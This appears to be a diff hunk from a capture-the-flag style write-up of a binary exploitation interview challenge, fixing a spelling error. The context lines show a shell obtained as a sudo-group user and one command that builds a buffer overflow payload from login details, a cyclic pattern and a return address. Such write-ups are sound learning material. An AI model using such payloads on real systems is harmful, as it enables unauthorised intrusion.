@@ -255,7 +255,7 @@ $ id
 uid=1000(htb-0xrogue) gid=1003(htb-0xrogue) groups=1003(htb-0xrogue),27(sudo)
 ```
 
-Pretty cool for an interview challenge and a bit different from the HTB challenges that I am use too. I also tried the following method of delivering a payload but I kept getting a segmmentation fault after getting a shell.
+Pretty cool for an interview challenge and a bit different from the HTB challenges that I am use too. I also tried the following method of delivering a payload but I kept getting a segmentation fault after getting a shell.
 
 ```console
 └──╼ [★]$ echo -en "user\neasy_pass\n$(cyclic 87)\x00\x26\x13\x40\x00\x00\x00\x00\x00" > payload3
